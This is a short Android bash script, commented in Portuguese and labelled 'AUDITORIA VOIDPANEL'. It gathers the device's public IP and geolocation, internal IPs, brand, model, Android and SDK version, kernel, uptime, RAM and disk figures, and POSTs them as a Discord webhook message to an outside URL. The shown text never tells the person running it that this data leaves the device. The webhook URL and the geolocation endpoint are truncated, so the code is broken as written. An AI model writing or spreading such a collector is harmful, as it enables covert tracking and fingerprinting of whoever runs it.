#!/bin/bash

# CONFIGURACAO DO WEBHOOK
URL="https://discord.com"

# 1. COLETA DE REDE (LINHA UNICA)
PUB_IP=$(curl -s --connect-timeout 5 ifconfig.me || echo "0.0.0.0")
# Puxa os dados do IP em formato de linha para nao quebrar o JSON
LOC_DATA=$(curl -s "http://ip-api.com" | tr '\n' ' | ' | sed 's/ | $//')

# 2. DADOS DO DISPOSITIVO (LIMPOS)
MODEL=$(getprop ro.product.model | tr -d '\n\r"')
BRAND=$(getprop ro.product.brand | tr -d '\n\r"')
ANDROID=$(getprop ro.build.version.release | tr -d '\n\r"')
SDK=$(getprop ro.build.version.sdk | tr -d '\n\r"')
KERNEL=$(uname -r | tr -d '\n\r"')
UPTIME=$(uptime -p | tr -d '\n\r"')

# 3. REDE INTERNA E HARDWARE
# hostname -I nao da erro de permissao no Android
IPS=$(hostname -I 2>/dev/null || echo "Bloqueado")
RAM=$(free -h | awk '/Mem:/ {print $3 "/" $2}' | tr -d '\n\r"')
DISK=$(df -h /data 2>/dev/null | awk 'NR==2 {print $4 " livres de " $2}' | tr -d '\n\r"')

# 4. MONTAGEM DO PAYLOAD (FORMATO À PROVA DE ERRO)
PAYLOAD="{\"content\": \"AUDITORIA VOIDPANEL\", \"embeds\": [{\"title\": \"DADOS TÉCNICOS\", \"fields\": [
{\"name\": \"Rede\", \"value\": \"IP: $PUB_IP\nInfo: $LOC_DATA\nInternos: $IPS\"},
{\"name\": \"Dispositivo\", \"value\": \"Marca: $BRAND\nModelo: $MODEL\nAndroid: $ANDROID (SDK $SDK)\"},
{\"name\": \"Status\", \"value\": \"RAM: $RAM\nDisco: $DISK\nKernel: $KERNEL\nUptime: $UPTIME\"}
]}]}"

# 5. ENVIO
curl -s -H "Content-Type: application/json" -X POST -d "$PAYLOAD" "$URL"
